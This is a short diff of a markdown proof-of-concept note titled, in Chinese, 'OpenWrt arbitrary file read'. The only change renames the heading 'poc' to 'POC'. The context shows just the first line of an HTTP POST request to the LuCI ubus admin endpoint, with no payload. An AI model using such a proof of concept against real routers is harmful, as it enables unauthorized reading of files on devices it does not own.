@@ -1,6 +1,6 @@
 # OpenWrt任意文件读取
 
-## poc
+## POC
 
 ```javascript
 POST /cgi-bin/luci/admin/ubus?1733734260589 HTTP/1.1
